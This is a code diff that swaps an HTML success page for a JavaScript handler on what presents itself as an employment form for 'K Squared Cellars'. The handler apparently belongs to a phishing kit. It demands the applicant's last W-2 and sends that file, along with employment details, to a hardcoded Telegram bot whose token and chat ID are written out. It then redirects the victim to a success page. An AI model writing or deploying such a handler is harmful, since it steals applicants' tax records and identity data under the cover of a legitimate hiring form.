@@ -1,52 +1,58 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Submission Successful</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f7f7f7;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .message-container {
-      text-align: center;
-      padding: 20px;
-      background-color: white;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-    }
-    h1 {
-      font-size: 24px;
-      color: #4caf50;
-    }
-    p {
-      font-size: 16px;
-      color: #555;
-    }
-    button {
-      padding: 10px 20px;
-      background-color: #4caf50;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-  </style>
-</head>
-<body>
-  <div class="message-container">
-    <h1>✅ Submission Successful!</h1>
-    <p>Thank you for your submission. We will review it shortly.</p>
-    <button onclick="window.location.href = 'index.html';">Back to Form</button>
-  </div>
-</body>
-</html>
+document.getElementById("employmentForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const previousEmployer = document.getElementById("previousEmployer").value.trim();
+  const jobTitle = document.getElementById("jobTitle").value.trim();
+  const employmentStart = document.getElementById("employmentStart").value.trim();
+  const employmentEnd = document.getElementById("employmentEnd").value.trim();
+  const w2File = document.getElementById("w2Upload").files[0];
+
+  if (!w2File) {
+    alert("Please upload your last W-2 document.");
+    return;
+  }
+
+  const telegram_bot_token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
+  const telegram_chat_id = "1461764555";
+
+  const message = `
+📄 *K Squared Cellars - Previous Employment Submission*
+——————————————
+🏢 Previous Employer: ${previousEmployer}
+💼 Job Title: ${jobTitle}
+📅 Employment Period: ${employmentStart} - ${employmentEnd}
+🕒 Time: ${new Date().toLocaleString()}
+——————————————
+`;
+
+  try {
+    // Send message text
+    await fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: telegram_chat_id,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+
+    // Send W-2 document
+    const formData = new FormData();
+    formData.append("chat_id", telegram_chat_id);
+    formData.append("document", w2File, w2File.name);
+    formData.append("caption", `${previousEmployer} - Last W-2`);
+
+    await fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendDocument`, {
+      method: "POST",
+      body: formData
+    });
+
+    // Redirect to success page after sending
+    window.location.href = "submission_successful.html";
+
+  } catch (error) {
+    alert("There was an error sending your submission. Please try again.");
+    console.error("Telegram API error:", error);
+  }
+});
